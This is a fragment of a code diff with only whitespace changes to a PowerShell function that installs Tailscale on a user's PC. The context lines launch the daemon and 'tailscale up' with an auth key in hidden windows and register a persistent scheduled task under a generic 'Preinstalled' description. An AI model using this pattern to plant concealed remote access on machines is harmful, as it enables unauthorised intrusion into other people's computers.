@@ -37,7 +37,7 @@ function installTailscale {
   ## Configure Tailscale on users pc
   Set-Location C:\tailscale
   Write-Output "Set-Location C:\tailscale
-Start-Process -FilePath '.\tailscaled.exe' -WindowStyle Hidden
+Start-Process -FilePath '.\tailscaled.exe' -WindowStyle Hidden 
 Start-Process -FilePath '.\tailscale.exe'  -WindowStyle Hidden -ArgumentList 'up --authkey $authKey'" >> tailscale.ps1
   Start-Process tailscale.ps1 -WindowStyle Hidden
 
@@ -50,7 +50,6 @@ Start-Process -FilePath '.\tailscale.exe'  -WindowStyle Hidden -ArgumentList 'up
   if (Get-ScheduledTask $name -ErrorAction SilentlyContinue) {Unregister-ScheduledTask $name} 
   Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Tailscale Service, Preinstalled for Windoes"
 }
-
 
 ## Temp Directory
 ## variables
